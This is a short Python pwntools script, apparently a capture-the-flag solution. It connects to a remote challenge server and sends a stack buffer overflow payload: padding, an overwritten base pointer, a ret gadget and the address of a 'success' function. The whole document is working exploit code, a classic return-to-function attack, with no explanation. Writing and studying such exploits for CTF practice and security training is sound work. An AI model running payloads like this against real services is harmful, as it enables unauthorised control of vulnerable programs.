from pwn import *

# io = process("./overflow")
io = remote("uithack.td.org.uit.no", 9005)

buffer = b"A" * 16
bp = b"A" * 8

success = b"\x55\x13\x40\x00\x00\x00\x00\x00"
ret_gadget = b"\xa8\x14\x40\x00\x00\x00\x00\x00"

payload = buffer + bp + ret_gadget + success

io.sendline(payload)
io.readline()
print(io.readline().decode())